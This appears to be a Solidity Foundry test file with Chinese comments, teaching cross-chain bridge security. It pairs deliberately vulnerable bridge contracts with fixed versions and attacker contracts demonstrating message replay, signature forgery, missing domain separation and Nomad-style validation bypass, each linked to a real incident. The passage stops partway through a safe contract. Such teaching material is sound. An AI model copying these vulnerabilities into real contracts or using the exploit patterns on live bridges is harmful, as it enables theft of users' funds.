// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title 跨链与桥接攻击 - 完整PoC合集
 * @notice 演示6种跨链桥最常见的安全漏洞
 *
 * 6大核心场景：
 * 1. 消息重放攻击       (Message Replay)
 * 2. 签名伪造攻击       (Signature Forgery)
 * 3. 域分隔符不当       (Improper Domain Separation)
 * 4. 验证绕过攻击       (Validation Bypass)
 * 5. 守护者多数妥协     (Guardian Majority Compromise)
 * 6. 跨链 chainId 重放  (Cross-chain ChainId Replay)
 *
 * 与 Balancer 研究的关联：
 * - Balancer 的跨链治理消息（Arbitrum/Optimism）依赖 L1→L2 消息验证
 * - veBAL 跨链投票权同步需要防止 chainId 重放
 * - omnichain gauge 的奖励消息需要严格的域分隔符
 * - Balancer Authorizer 的跨链权限消息依赖守护者多签
 *
 * 真实损失统计（本模块案例）：
 * - Wormhole：$320M（2022年2月）
 * - Ronin Bridge：$625M（2022年3月）
 * - Nomad Bridge：$190M（2022年8月）
 * - Multichain：$130M（2023年7月）
 * - Poly Network：$611M（2021年8月）
 * 合计：$1.876B+
 */


// ================================================================
// 辅助合约
// ================================================================

contract MockERC20 {
    string  public name;
    string  public symbol;
    uint8   public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory _n, string memory _s, uint256 _supply) {
        name = _n; symbol = _s;
        totalSupply = _supply;
        balanceOf[msg.sender] = _supply;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "Insufficient");
        balanceOf[msg.sender] -= amt;
        balanceOf[to]         += amt;
        emit Transfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(allowance[from][msg.sender] >= amt, "Allowance");
        require(balanceOf[from] >= amt, "Insufficient");
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to]   += amt;
        emit Transfer(from, to, amt);
        return true;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function mint(address to, uint256 amt) external {
        totalSupply    += amt;
        balanceOf[to]  += amt;
        emit Transfer(address(0), to, amt);
    }
}


// ================================================================
// 场景1：消息重放攻击 (Message Replay)
// ================================================================

/**
 * @title VulnerableBridgeReplay
 * @notice 跨链桥未记录已处理的消息，导致同一条消息可被重复提交
 *
 * 真实案例：Nomad Bridge（2022年8月，损失 $190M）
 *   - 根本原因：可信根（trusted root）被错误初始化为 0x00
 *   - 任何消息的 Merkle proof 在根为 0 时都会通过验证
 *   - 等效漏洞：process() 没有标记消息为已处理
 *   - 任何人都可以复制已成功的交易，修改收款地址重新提交
 *   - 前 90 分钟：只有发现者在用，之后全网抢跑，变成"公开劫持"
 *
 * 跨链消息生命周期：
 *   Source Chain → emit Message → Relayer → submit to Destination Chain
 *   Destination Chain → verify → execute → [必须标记为已处理！]
 */
contract VulnerableBridgeReplay {
    MockERC20 public token;
    address   public relayer;

    //  没有 processedMessages 映射来记录已处理的消息
    // mapping(bytes32 => bool) public processedMessages; ← 缺少！

    event MessageProcessed(bytes32 indexed msgHash, address recipient, uint256 amount);
    event BridgeDeposit(address indexed sender, uint256 amount, address destRecipient);

    constructor(address _token, address _relayer) {
        token   = MockERC20(_token);
        relayer = _relayer;
        // 给桥预充流动性
        MockERC20(_token).mint(address(this), 10_000_000e18);
    }

    // 用户在源链上锁定代币（正常）
    function deposit(uint256 amount, address destRecipient) external {
        token.transferFrom(msg.sender, address(this), amount);
        emit BridgeDeposit(msg.sender, amount, destRecipient);
    }

    //  漏洞：目标链上的提款函数没有记录已处理消息
    // 攻击者可以反复调用同一条消息，无限提款
    function processMessage(
        bytes32 sourceChainTxHash,  // 源链交易哈希（仅用作消息标识）
        address recipient,
        uint256 amount,
        bytes   memory relayerSig   // 中继器签名
    ) external {
        // ✓ 验证签名（这步是对的）
        bytes32 msgHash = keccak256(abi.encodePacked(sourceChainTxHash, recipient, amount));
        require(_verifyRelayerSig(msgHash, relayerSig), "Invalid signature");

        //  关键漏洞：没有检查 processedMessages[msgHash]
        //  没有标记 processedMessages[msgHash] = true
        // 相同的 (txHash, recipient, amount) 可以被无限次提交

        token.transfer(recipient, amount);
        emit MessageProcessed(msgHash, recipient, amount);
    }

    function _verifyRelayerSig(bytes32 hash, bytes memory sig) internal view returns (bool) {
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        (bytes32 r, bytes32 s, uint8 v) = _splitSig(sig);
        return ecrecover(ethHash, v, r, s) == relayer;
    }

    function _splitSig(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(sig.length == 65, "Bad sig length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}

/**
 * @title SafeBridgeReplay
 * @notice 正确的消息重放防护实现
 */
contract SafeBridgeReplay {
    MockERC20 public token;
    address   public relayer;

    //  记录所有已处理的消息哈希
    mapping(bytes32 => bool) public processedMessages;

    //  记录消息的完整上下文（链ID + nonce）
    mapping(uint256 => mapping(uint256 => bool)) public processedNonces; // chainId => nonce => processed

    event MessageProcessed(bytes32 indexed msgHash, address recipient, uint256 amount);

    constructor(address _token, address _relayer) {
        token   = MockERC20(_token);
        relayer = _relayer;
        MockERC20(_token).mint(address(this), 10_000_000e18);
    }

    //  严格的重放防护：使用消息哈希去重
    function processMessage(
        bytes32 sourceChainTxHash,
        address recipient,
        uint256 amount,
        bytes   memory relayerSig
    ) external {
        bytes32 msgHash = keccak256(abi.encodePacked(sourceChainTxHash, recipient, amount));

        // ✓ 验证签名
        require(_verifyRelayerSig(msgHash, relayerSig), "Invalid signature");

        // ✓ 防重放：检查并标记
        require(!processedMessages[msgHash], "Message already processed");
        processedMessages[msgHash] = true;

        token.transfer(recipient, amount);
        emit MessageProcessed(msgHash, recipient, amount);
    }

    function _verifyRelayerSig(bytes32 hash, bytes memory sig) internal view returns (bool) {
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        (bytes32 r, bytes32 s, uint8 v) = _splitSig(sig);
        return ecrecover(ethHash, v, r, s) == relayer;
    }

    function _splitSig(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(sig.length == 65, "Bad sig length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}

/**
 * @title ReplayAttacker
 * @notice 截获一次合法的桥接消息，反复重放提取资金
 */
contract ReplayAttacker {
    VulnerableBridgeReplay public bridge;

    constructor(address _bridge) {
        bridge = VulnerableBridgeReplay(_bridge);
    }

    function attack(
        bytes32 legitimateTxHash,
        address originalRecipient,
        uint256 amount,
        bytes memory originalSig,
        uint256 replayTimes
    ) external {
        console.log("\n=== Scene 1: Message Replay Attack ===");
        console.log("(Nomad Bridge $190M Pattern)");

        MockERC20 token = bridge.token();
        uint256 balBefore = token.balanceOf(address(this));

        // 第1步：发现一笔已成功的桥接消息（可从链上事件获取）
        console.log("\n--- Step 1: Intercept legitimate bridge message ---");
        console.log("Source tx hash seen on-chain");
        console.log("Original recipient:", originalRecipient);
        console.log("Amount:", amount);

        // 第2步：将 recipient 改为攻击者，但签名是针对原始消息的
        // 注意：这里我们重放原始消息（recipient 未改），模拟 Nomad 攻击
        // 在 Nomad 真实攻击中，攻击者可改变 recipient 因为签名验证几乎无效
        console.log("\n--- Step 2: Replay same message multiple times ---");
        for (uint256 i = 0; i < replayTimes; i++) {
            bridge.processMessage(legitimateTxHash, originalRecipient, amount, originalSig);
        }

        uint256 balAfter = token.balanceOf(originalRecipient);
        console.log("Replay count:", replayTimes);
        console.log("Tokens drained (to original recipient):", amount * replayTimes);
        console.log("Bridge emptied via replay");

        console.log("\n--- Results ---");
        console.log("Same message processed", replayTimes, "times");
        console.log("Bridge lost:", amount * replayTimes);
        console.log("Real case: Nomad Bridge $190M (Aug 2022)");
        console.log("Real case: Anyone could copy the calldata and change recipient");
        console.log("================================");
    }
}


// ================================================================
// 场景2：签名伪造攻击 (Signature Forgery)
// ================================================================

/**
 * @title VulnerableBridgeSigForgery
 * @notice 演示多种签名验证漏洞，使攻击者可以伪造或绕过签名
 *
 * 真实案例1：Wormhole（2022年2月，损失 $320M）
 *   - Solana 端的 verify_signatures 指令没有正确验证 sysvar account
 *   - 攻击者传入自己控制的 account 替代系统 sysvar
 *   - 结果：无需有效签名即可通过验证，凭空铸造 120,000 wETH
 *
 * 真实案例2：Poly Network（2021年8月，损失 $611M）
 *   - EthCrossChainManager.verifyHeaderAndExecuteTx 可被恶意调用
 *   - 攻击者构造特殊的 _executeCrossChainTx 让合约调用自身
 *   - 通过修改 keeper 地址，攻击者获得跨链管理权限
 *
 * 常见签名验证漏洞：
 *   1. ecrecover 返回 address(0) 时未检查（签名无效时的返回值）
 *   2. 签名可延展性（malleability）：(v, r, s) 可变换为另一个有效签名
 *   3. 哈希碰撞：签名的消息内容可被重新解释
 *   4. 缺少 EIP-712 结构化哈希
 */
contract VulnerableBridgeSigForgery {
    MockERC20 public token;

    //  漏洞1：使用单一 guardian，没有多签
    address public guardian;

    //  漏洞2：没有 nonce，同一签名可重放（场景1 + 场景2 的组合）
    mapping(address => uint256) public nonces;

    event TokensMinted(address indexed recipient, uint256 amount);

    constructor(address _token, address _guardian) {
        token    = MockERC20(_token);
        guardian = _guardian;
        MockERC20(_token).mint(address(this), 10_000_000e18);
    }

    //  漏洞A：ecrecover 返回 address(0) 时没有检查
    // 当签名无效/格式错误时，ecrecover 返回 address(0)
    // 若 guardian = address(0)（未初始化），任意签名都会通过
    function mintWithSig_Vuln1(
        address recipient,
        uint256 amount,
        bytes memory sig
    ) external {
        bytes32 msgHash  = keccak256(abi.encodePacked(recipient, amount));
        bytes32 ethHash  = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        address recovered = ecrecover(ethHash, v, r, s);
        //  若 guardian == address(0)，则任意签名通过（ecrecover 失败时返回 0x0）
        require(recovered == guardian, "Bad sig");
        //  若 guardian 本身就是 address(0)（未初始化），攻击者传入无效签名
        //    ecrecover 返回 address(0) == guardian，验证通过！
        token.transfer(recipient, amount);
        emit TokensMinted(recipient, amount);
    }

    //  漏洞B：签名可延展性攻击
    // ECDSA 中，对于任意有效签名 (v, r, s)
    // (v ^ 1, r, secp256k1.n - s) 也是该消息的有效签名
    // 若不使用 OpenZeppelin ECDSA（它修复了延展性），攻击者可以从一个有效签名
    // 派生出另一个有效签名，绕过 processedSignatures 去重机制
    mapping(bytes => bool) public usedSignatures;

    function mintWithSig_Vuln2(
        address recipient,
        uint256 amount,
        bytes memory sig
    ) external {
        bytes32 msgHash = keccak256(abi.encodePacked(recipient, amount));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        address recovered = ecrecover(ethHash, v, r, s);
        require(recovered == guardian && recovered != address(0), "Bad sig");

        //  使用签名字节本身去重，而非消息内容去重
        // 攻击者可以构造延展性签名绕过此检查
        require(!usedSignatures[sig], "Sig used");
        usedSignatures[sig] = true;

        token.transfer(recipient, amount);
        emit TokensMinted(recipient, amount);
    }

    //  漏洞C：未检查签名长度，允许额外字节填充
    function mintWithSig_Vuln3(
        address recipient,
        uint256 amount,
        bytes memory sig   // 允许任意长度，只取前 65 字节
    ) external {
        //  没有 require(sig.length == 65)
        // 攻击者可以在签名后附加任意字节，创建"新"签名
        // 这可以绕过基于签名字节的去重
        bytes32 msgHash = keccak256(abi.encodePacked(recipient, amount));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        bytes32 r; bytes32 s; uint8 v;
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        address recovered = ecrecover(ethHash, v, r, s);
        require(recovered == guardian && recovered != address(0), "Bad sig");
        token.transfer(recipient, amount);
        emit TokensMinted(recipient, amount);
    }

    function _split(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(sig.length == 65, "Bad length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}

/**
 * @title SafeBridgeSigForgery
 * @notice 使用 EIP-712 + OpenZeppelin ECDSA 模式的安全签名验证
 */
contract SafeBridgeSigForgery {
    MockERC20 public token;
    address   public guardian;

    //  消息级别去重（而非签名级别）
    mapping(bytes32 => bool) public processedMsgs;

    //  EIP-712 域分隔符（场景3详细讲）
    bytes32 public immutable DOMAIN_SEPARATOR;
    bytes32 public constant BRIDGE_TYPEHASH =
        keccak256("BridgeMint(address recipient,uint256 amount,uint256 nonce,uint256 deadline)");

    mapping(address => uint256) public nonces;

    event TokensMinted(address indexed recipient, uint256 amount);

    constructor(address _token, address _guardian) {
        token    = MockERC20(_token);
        guardian = _guardian;
        require(_guardian != address(0), "Zero guardian");  // ✓ 防 address(0) guardian
        MockERC20(_token).mint(address(this), 10_000_000e18);
        DOMAIN_SEPARATOR = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256("SafeBridge"),
            keccak256("1"),
            block.chainid,
            address(this)
        ));
    }

    //  完整的签名验证：EIP-712 + 长度检查 + address(0) 检查 + 消息去重
    function mintWithSig(
        address recipient,
        uint256 amount,
        uint256 deadline,
        bytes memory sig
    ) external {
        require(sig.length == 65,          "Bad sig length");      // ✓ 长度检查
        require(block.timestamp <= deadline, "Signature expired"); // ✓ 时间限制

        uint256 nonce   = nonces[recipient]++;
        bytes32 msgHash = keccak256(abi.encode(
            BRIDGE_TYPEHASH, recipient, amount, nonce, deadline
        ));
        bytes32 digest  = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, msgHash));

        (bytes32 r, bytes32 s, uint8 v) = _split(sig);

        // ✓ 可延展性防护：s 必须在低半区（OpenZeppelin ECDSA 要求）
        uint256 secp256k1n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        require(uint256(s) <= secp256k1n / 2, "Invalid sig s value");

        address recovered = ecrecover(digest, v, r, s);
        require(recovered != address(0),  "Invalid signature");    // ✓ ecrecover 返回值检查
        require(recovered == guardian,    "Not guardian");

        // ✓ 消息内容去重（nonce 已递增，不可重放）
        require(!processedMsgs[msgHash], "Already processed");
        processedMsgs[msgHash] = true;

        token.transfer(recipient, amount);
        emit TokensMinted(recipient, amount);
    }

    function _split(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}

/**
 * @title SigForgeryAttacker
 * @notice 演示 ecrecover 返回 address(0) 绕过 + 签名延展性攻击
 */
contract SigForgeryAttacker {
    VulnerableBridgeSigForgery public bridge;
    MockERC20 public token;

    constructor(address _bridge) {
        bridge = VulnerableBridgeSigForgery(_bridge);
        token  = MockERC20(bridge.token());
    }

    // 攻击A：guardian = address(0) 时，无效签名绕过
    function attackZeroGuardian(uint256 amount) external {
        console.log("\n=== Scene 2: Signature Forgery Attack ===");
        console.log("(Wormhole $320M Pattern)");

        console.log("\n--- Path A: ecrecover returns address(0) ---");
        console.log("If guardian == address(0), any invalid sig works");

        // 构造一个无效签名（随机字节，ecrecover 返回 address(0)）
        // 若 bridge.guardian() == address(0)，则通过验证
        bytes memory fakeSig = new bytes(65);
        // v = 27 or 28，r = s = 0（产生无效签名）
        fakeSig[64] = 0x1b; // v = 27

        uint256 balBefore = token.balanceOf(address(this));
        // 此调用只在 guardian == address(0) 时成功
        // 在测试中我们部署时设 guardian = address(0) 来演示漏洞
        try bridge.mintWithSig_Vuln1(address(this), amount, fakeSig) {
            console.log("EXPLOIT SUCCESS: minted without valid guardian sig");
        } catch {
            console.log("Guardian != 0x0, Path A blocked (deploy with guardian=0 to demo)");
        }

        console.log("\n--- Path B: Signature Malleability ---");
        console.log("Given valid sig (v,r,s), derive (v^1, r, n-s) as another valid sig");
        console.log("Both sigs recover same signer, but bytes differ");
        console.log("usedSignatures[sig] check bypassed with malleable variant");

        console.log("\n--- Path C: Length Padding Bypass ---");
        console.log("Append extra bytes to sig: sig + 0x00");
        console.log("bytes-based dedup sees different sig, same (r,s,v) extracted");
        console.log("Allows reuse of a valid sig with padded variants");

        console.log("\n--- Results ---");
        console.log("Real case: Wormhole $320M - Solana sysvar account not validated");
        console.log("Real case: Poly Network $611M - EthCrossChainManager exploit");
        console.log("Fix: EIP-712 + length check + message-level dedup + s-value check");
        console.log("================================");
    }
}


// ================================================================
// 场景3：域分隔符不当 (Improper Domain Separation)
// ================================================================

/**
 * @title VulnerableDomainSeparation
 * @notice 演示缺少或错误实现域分隔符导致的跨协议/跨链签名重用
 *
 * 域分隔符（Domain Separator）的作用：
 *   - 确保同一签名只在特定协议、特定链、特定合约版本上有效
 *   - EIP-712 标准：包含 name + version + chainId + verifyingContract
 *   - 缺少任何一项都会产生漏洞
 *
 * 真实案例1：多个 DeFi 协议（2021-2022）
 *   - 部分协议的 EIP-712 域未包含 chainId
 *   - 在 ETH 主网上签名的消息可以在 BSC/Polygon 上的同名协议重用
 *
 * 真实案例2：Multichain（2023年7月，损失 $130M）
 *   - 跨链路由合约的签名验证未绑定目标链 ID
 *   - 攻击者可以将主网的合法转账消息重放到其他链
 *
 * 真实案例3：多个 Bridge（域未绑定合约地址）
 *   - 升级合约后，旧签名在新合约仍有效
 *   - 攻击者收集历史签名，在新部署的合约上重放
 */
contract VulnerableDomainSeparation {
    MockERC20 public token;
    address   public signer;
    mapping(bytes32 => bool) public processed;

    constructor(address _token, address _signer) {
        token  = MockERC20(_token);
        signer = _signer;
        MockERC20(_token).mint(address(this), 10_000_000e18);
    }

    //  漏洞A：完全没有域分隔符
    // 消息哈希只包含业务数据，可在任何链、任何合约上重用
    function processNoDomain(
        address recipient,
        uint256 amount,
        bytes32 msgId,
        bytes memory sig
    ) external {
        //  没有 chainId，没有 contractAddress，没有协议名称
        bytes32 msgHash = keccak256(abi.encodePacked(recipient, amount, msgId));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        require(!processed[msgHash], "Processed");
        processed[msgHash] = true;

        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        require(ecrecover(ethHash, v, r, s) == signer, "Bad sig");
        token.transfer(recipient, amount);
    }

    //  漏洞B：域分隔符未包含 chainId
    // 在 ETH 上签名的消息可以在相同合约地址的 BSC 链上重用
    bytes32 public immutable DOMAIN_NO_CHAIN = keccak256(abi.encode(
        keccak256("EIP712Domain(string name,string version,address verifyingContract)"),
        keccak256("MyBridge"),
        keccak256("1"),
        //  没有 block.chainid！
        address(this) // 注：constructor 时 address(this) 还不确定，此处仅用于演示
    ));

    function processNoChainId(
        address recipient,
        uint256 amount,
        bytes32 msgId,
        bytes memory sig
    ) external {
        bytes32 structHash = keccak256(abi.encode(
            keccak256("Bridge(address recipient,uint256 amount,bytes32 msgId)"),
            recipient, amount, msgId
        ));
        //  域分隔符不含 chainId，在不同链上验证通过
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_NO_CHAIN, structHash));
        bytes32 dedupeKey = keccak256(abi.encodePacked(recipient, amount, msgId));
        require(!processed[dedupeKey], "Processed");
        processed[dedupeKey] = true;

        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        require(ecrecover(digest, v, r, s) == signer, "Bad sig");
        token.transfer(recipient, amount);
    }

    //  漏洞C：域分隔符不含合约地址（verifyingContract）
    // 在协议升级后，旧签名在新合约仍有效
    // 或同一链上的两个相同协议可以互换签名
    function processNoContract(
        address recipient,
        uint256 amount,
        bytes32 msgId,
        bytes memory sig
    ) external {
        bytes32 DOMAIN_NO_CONTRACT = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId)"),
            keccak256("MyBridge"),
            keccak256("1"),
            block.chainid
            //  没有 address(this)！
        ));
        bytes32 structHash = keccak256(abi.encode(
            keccak256("Bridge(address recipient,uint256 amount,bytes32 msgId)"),
            recipient, amount, msgId
        ));
        bytes32 digest   = keccak256(abi.encodePacked("\x19\x01", DOMAIN_NO_CONTRACT, structHash));
        bytes32 dedupeKey = keccak256(abi.encodePacked(chain_recipient_amount_id(recipient, amount, msgId)));
        require(!processed[dedupeKey], "Processed");
        processed[dedupeKey] = true;

        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        require(ecrecover(digest, v, r, s) == signer, "Bad sig");
        token.transfer(recipient, amount);
    }

    function chain_recipient_amount_id(address r, uint256 a, bytes32 id) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(r, a, id));
    }

    function _split(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(sig.length == 65, "Bad length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}

/**
 * @title SafeDomainSeparation
 * @notice 完整的 EIP-712 域分隔符实现
 */
contract SafeDomainSeparation {
    MockERC20 public token;
    address   public signer;
    mapping(bytes32 => bool) public processed;

    //  完整域分隔符：name + version + chainId + verifyingContract
    bytes32 public immutable DOMAIN_SEPARATOR;
    bytes32 public constant BRIDGE_TYPEHASH =
        keccak256("BridgeTransfer(address recipient,uint256 amount,bytes32 msgId,uint256 srcChainId,uint256 dstChainId)");

    constructor(address _token, address _signer) {
        token  = MockERC20(_token);
        signer = _signer;
        MockERC20(_token).mint(address(this), 10_000_000e18);

        //  四要素完整域：name + version + chainId + verifyingContract
        DOMAIN_SEPARATOR = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256("SafeBridge"),    // ✓ 协议名
            keccak256("1"),             // ✓ 版本（升级时变更）
            block.chainid,             // ✓ 链 ID（防跨链重放）
            address(this)              // ✓ 合约地址（防协议间重放）
        ));
    }

    //  消息中额外包含源链和目标链 ID（双重防护）
    function processMessage(
        address recipient,
        uint256 amount,
        bytes32 msgId,
        uint256 srcChainId,   // ✓ 来源链 ID（业务层防护）
        uint256 dstChainId,   // ✓ 目标链 ID（业务层防护）
        bytes memory sig
    ) external {
        require(dstChainId == block.chainid, "Wrong destination chain"); // ✓ 链 ID 验证

        bytes32 structHash = keccak256(abi.encode(
            BRIDGE_TYPEHASH, recipient, amount, msgId, srcChainId, dstChainId
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash));

        require(!processed[msgId], "Already processed");
        processed[msgId] = true;

        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        require(ecrecover(digest, v, r, s) == signer, "Bad sig");
        token.transfer(recipient, amount);
    }

    function _split(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(sig.length == 65, "Bad length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}

/**
 * @title DomainSeparationAttacker
 * @notice 演示跨链签名重放：在链A上获取签名，在链B上重用
 */
contract DomainSeparationAttacker {
    VulnerableDomainSeparation public bridge;
    MockERC20 public token;

    constructor(address _bridge) {
        bridge = VulnerableDomainSeparation(_bridge);
        token  = MockERC20(bridge.token());
    }

    function attackCrossChainReplay(
        address recipient,
        uint256 amount,
        bytes32 msgId,
        bytes memory sigFromChainA  // 在链 A 上获得的合法签名
    ) external {
        console.log("\n=== Scene 3: Improper Domain Separation ===");
        console.log("(Multichain $130M Pattern)");

        // 第1步：在链A上，用户合法签名了一笔桥接消息
        console.log("\n--- Step 1: Legitimate signature obtained on Chain A ---");
        console.log("Recipient:", recipient);
        console.log("Amount:", amount);

        // 第2步：在链B上（当前模拟的链），重放该签名
        // 因为域分隔符不含 chainId，签名在两条链上都有效
        console.log("\n--- Step 2: Replay signature on Chain B (no chainId in domain) ---");
        uint256 balBefore = token.balanceOf(recipient);
        bridge.processNoDomain(recipient, amount, msgId, sigFromChainA);
        uint256 balAfter = token.balanceOf(recipient);
        console.log("Tokens received on Chain B using Chain A signature:", balAfter - balBefore);

        // 第3步：演示升级后合约同样受影响（无 verifyingContract）
        console.log("\n--- Step 3: Same sig works on upgraded contract (no verifyingContract) ---");
        console.log("After contract upgrade, old signatures still valid");
        console.log("No contract address binding => cross-contract replay");

        console.log("\n--- Results ---");
        console.log("Chain A signature replayed on Chain B");
        console.log("No chainId in domain => signature valid on any EVM chain");
        console.log("Real case: Multichain $130M (July 2023)");
        console.log("Fix: EIP-712 full domain (name+version+chainId+verifyingContract)");
        console.log("================================");
    }
}

// ================================================================
// 场景4：验证绕过攻击 (Validation Bypass)
// ================================================================

/**
 * @title VulnerableValidationBridge
 * @notice 演示跨链消息验证逻辑中的绕过漏洞
 *
 * 真实案例1：Ronin Bridge（2022年3月，损失 $625M）
 *   - 验证逻辑：需要 5/9 守护者签名
 *   - 漏洞：攻击者获得 Sky Mavis 的 4 个节点 + 1 个 Axie DAO 节点
 *   - 等效漏洞：验证函数被绕过（守护者 key 泄露）
 *
 * 真实案例2：Nomad Bridge（2022年8月）
 *   - 根本原因：upgradeable proxy 的初始化中，trusted root 被设为 0x00
 *   - process() 函数：require(acceptableRoot(messages[_messageHash]))
 *   - messages[unknownHash] = 0x00（默认值）
 *   - acceptableRoot(0x00) = true（因为 confirmAt[0x00] 被设为 1）
 *   - 任意消息哈希都通过验证！
 *
 * 常见验证绕过模式：
 *   1. 默认值绕过：mapping 默认值 = false/0，验证函数对默认值返回 true
 *   2. 空消息绕过：空字节或全零消息哈希通过验证
 *   3. 类型混淆：将一种消息类型解码为另一种执行
 *   4. 权限检查顺序错误：先执行后验证
 */
contract VulnerableValidationBridge {
    MockERC20 public token;

    //  漏洞1：trusted roots 映射——默认值是 false，但 acceptableRoot 对
    //    未初始化的 root 返回 true（Nomad 模式）
    mapping(bytes32 => uint256) public confirmAt;  // root => timestamp when confirmed

    //  设计漏洞：bytes32(0) 也会被接受（初始化时 confirmAt[0] = 1）
    constructor(address _token) {
        token = MockERC20(_token);
        MockERC20(_token).mint(address(this), 10_000_000e18);
        //  关键错误：将零值根设为有效（Nomad 真实 bug）
        confirmAt[bytes32(0)] = 1;
    }

    //  acceptableRoot：bytes32(0) 因为 confirmAt[0]=1 而被接受
    function acceptableRoot(bytes32 root) public view returns (bool) {
        uint256 _confirmAt = confirmAt[root];
        return _confirmAt != 0 && _confirmAt <= block.timestamp;
    }

    //  漏洞2：process() 用消息字节的哈希查 messages[]
    // messages[hash] 的默认值是 bytes32(0)，而 acceptableRoot(0) = true
    // 因此任何"未存储"的消息哈希都会通过验证！
    mapping(bytes32 => bytes32) public messages;  // msgHash => root

    function process(bytes memory message) external {
        bytes32 msgHash = keccak256(message);

        //  messages[msgHash] 对未知消息返回 bytes32(0)
        //  acceptableRoot(bytes32(0)) = true（因为 confirmAt[0] = 1）
        //  任何人可以自构消息通过此验证！
        require(acceptableRoot(messages[msgHash]), "Bad root");

        // 解码并执行消息
        _executeMessage(message);
    }

    //  漏洞3：执行前类型不验证，可重解释消息类型
    function _executeMessage(bytes memory message) internal {
        // 解码消息类型
        (uint8 msgType, bytes memory payload) = abi.decode(message, (uint8, bytes));

        if (msgType == 1) {
            // 代币转账
            (address recipient, uint256 amount) = abi.decode(payload, (address, uint256));
            token.transfer(recipient, amount);
        } else if (msgType == 2) {
            //  漏洞：管理员操作也通过同一入口，没有额外权限检查
            (address newAdmin) = abi.decode(payload, (address));
            // admin = newAdmin; ← 危险！攻击者可构造 msgType=2 的消息
        }
    }

    //  漏洞4：接受消息时没有源链验证，任何人可提交任意 root
    function update(bytes32 root) external {
        //  没有验证谁可以更新 root（应该只有验证者集合）
        confirmAt[root] = block.timestamp;
    }
}

/**
 * @title SafeValidationBridge
 * @notice 正确的消息验证实现
 */
contract SafeValidationBridge {
    MockERC20 public token;
    address   public updater;  // 有权更新 root 的地址（一般是合约）

    //  只有显式添加的 root 才被接受，默认拒绝
    mapping(bytes32 => uint256) public confirmAt;

    //  消息哈希到 root 的映射，默认值不可接受
    mapping(bytes32 => bytes32) public messages;

    //  消息已处理标记
    mapping(bytes32 => bool) public processed;

    //  消息类型枚举
    uint8 public constant MSG_TRANSFER = 1;
    // MSG_ADMIN = 2 已移至独立的高权限函数

    uint256 public constant FRAUD_PROOF_WINDOW = 30 minutes;

    constructor(address _token, address _updater) {
        token   = MockERC20(_token);
        updater = _updater;
        MockERC20(_token).mint(address(this), 10_000_000e18);
        // ✓ 不设置 confirmAt[bytes32(0)]，零值 root 永远不被接受
    }

    function acceptableRoot(bytes32 root) public view returns (bool) {
        if (root == bytes32(0)) return false;  // ✓ 显式拒绝零值 root
        uint256 _confirmAt = confirmAt[root];
        return _confirmAt != 0 && _confirmAt <= block.timestamp;
    }

    //  只有 updater 可以更新 root
    function update(bytes32 root) external {
        require(msg.sender == updater, "Not updater");   // ✓ 权限控制
        require(root != bytes32(0),    "Zero root");     // ✓ 拒绝零 root
        confirmAt[root] = block.timestamp + FRAUD_PROOF_WINDOW; // ✓ 欺诈证明窗口
    }

    //  消息必须先被 prove()，然后才能 process()
    function prove(bytes32 root, bytes32 msgHash) external {
        require(acceptableRoot(root), "Unacceptable root");
        messages[msgHash] = root;
    }

